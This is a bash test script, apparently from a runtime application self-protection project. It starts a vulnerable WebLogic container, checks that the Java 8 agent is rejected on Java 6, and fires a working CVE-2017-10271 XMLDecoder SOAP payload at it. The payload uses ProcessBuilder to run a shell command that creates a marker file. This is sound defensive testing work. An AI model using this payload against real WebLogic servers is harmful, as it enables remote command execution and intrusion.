#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
image="${OHMYRASP_VULHUB_WEBLOGIC_10271_IMAGE:-vulhub/weblogic:10.3.6.0-2017}"
baseline_name="${OHMYRASP_VULHUB_WEBLOGIC_10271_BASELINE_NAME:-ohmyrasp-weblogic10271-baseline}"
baseline_port="${OHMYRASP_VULHUB_WEBLOGIC_10271_BASELINE_PORT:-19670}"
marker="${OHMYRASP_VULHUB_WEBLOGIC_10271_MARKER:-/tmp/ohmyrasp-weblogic-10271-success}"
baseline_dir="logs/vulhub-weblogic-10.3.6.0-10271-java6-baseline"
protected_dir="logs/vulhub-weblogic-10.3.6.0-10271-java6-protected"
gradle_cache_dir=""

copy_artifacts() {
  mkdir -p "$baseline_dir"
  if docker inspect "$baseline_name" >/dev/null 2>&1; then
    docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
    docker exec "$baseline_name" bash -lc \
      'tail -n 220 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log 2>/dev/null || true' \
      > "${baseline_dir}/adminserver.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts
  docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true
  if [[ -n "${gradle_cache_dir:-}" ]]; then
    rm -rf "${gradle_cache_dir}" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

build_java8_agent() {
  gradle_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/ohmyrasp-gradle-cache-weblogic10271.XXXXXX")"
  docker run --rm -u "$(id -u):$(id -g)" \
    -e GRADLE_USER_HOME=/tmp/gradle-cache \
    -v "${gradle_cache_dir}:/tmp/gradle-cache" \
    -v "$(pwd):/workspace" \
    -w /workspace \
    gradle:jdk25 \
    gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null
}

verify_java6_boundary() {
  docker run --rm --entrypoint bash "$image" -lc \
    '"$JAVA16_HOME/bin/java" -version' > "${protected_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'java version "1.6.0_45"' "${protected_dir}/image-java-version.txt"; then
    cat "${protected_dir}/image-java-version.txt" >&2 || true
    echo "WebLogic CVE-2017-10271 image did not report the expected Java 6 runtime" >&2
    exit 1
  fi

  set +e
  docker run --rm --entrypoint bash \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    "$image" -lc '"$JAVA16_HOME/bin/java" -javaagent:/tmp/ohmyrasp-agent-java8.jar -version' \
    > "${protected_dir}/java8-agent-on-java6.log" 2>&1
  local status="$?"
  set -e
  printf 'java8_agent_on_java6_status=%s\n' "$status" > "${protected_dir}/attempts.log"
  if ! grep -Fq 'Unsupported major.minor version 52.0' "${protected_dir}/java8-agent-on-java6.log"; then
    cat "${protected_dir}/java8-agent-on-java6.log" >&2 || true
    echo "Java 6 WebLogic did not reject the Java 8 agent with the expected class-version error" >&2
    exit 1
  fi
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:7001" \
    "$image" >/dev/null
}

wait_for_weblogic() {
  local status
  for attempt in $(seq 1 240); do
    status="$(curl_status "${baseline_dir}/ready-${attempt}.html" \
      "http://127.0.0.1:${baseline_port}/")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${baseline_dir}/attempts.log"
    if [[ "$status" == "404" || "$status" == "200" ]]; then
      cp "${baseline_dir}/ready-${attempt}.html" "${baseline_dir}/root-ready.html"
      return
    fi
    if ! docker ps --filter "name=${baseline_name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$baseline_name"; then
      docker logs "$baseline_name" >&2 || true
      echo "WebLogic baseline container stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done

  docker logs "$baseline_name" >&2 || true
  echo "WebLogic baseline did not become ready on ${baseline_port}" >&2
  exit 1
}

write_payload() {
  local output="$1"
  cat > "$output" <<EOF
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.4.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/sh</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>touch ${marker}</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
EOF
}

send_workcontext_payload() {
  local output="$1"
  local body="${baseline_dir}/workcontext-payload.xml"
  write_payload "$body"
  curl_status "$output" \
    -X POST \
    -H "Content-Type: text/xml" \
    --data-binary "@${body}" \
    "http://127.0.0.1:${baseline_port}/wls-wsat/CoordinatorPortType"
}

wait_for_xmldecoder_marker() {
  local status marker_present
  docker exec "$baseline_name" bash -lc "rm -f '${marker}'" >/dev/null 2>&1 || true
  for attempt in $(seq 1 90); do
    status="$(send_workcontext_payload "${baseline_dir}/workcontext-${attempt}.response")"
    sleep 1
    marker_present="no"
    if docker exec "$baseline_name" bash -lc "test -f '${marker}'" >/dev/null 2>&1; then
      marker_present="yes"
    fi
    printf 'workcontext_attempt=%s status=%s marker=%s\n' "$attempt" "$status" "$marker_present" \
      >> "${baseline_dir}/attempts.log"
    if [[ "$marker_present" == "yes" ]]; then
      docker exec "$baseline_name" bash -lc "ls -l '${marker}'" \
        > "${baseline_dir}/marker.txt" 2>&1 || true
      return
    fi
    sleep 1
  done

  docker logs "$baseline_name" >&2 || true
  echo "baseline WebLogic CVE-2017-10271 XMLDecoder payload did not create ${marker}" >&2
  exit 1
}

build_java8_agent

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

verify_java6_boundary
start_baseline
wait_for_weblogic
wait_for_xmldecoder_marker
copy_artifacts
docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

echo "vulhub WebLogic CVE-2017-10271 Java6 legacy boundary passed"
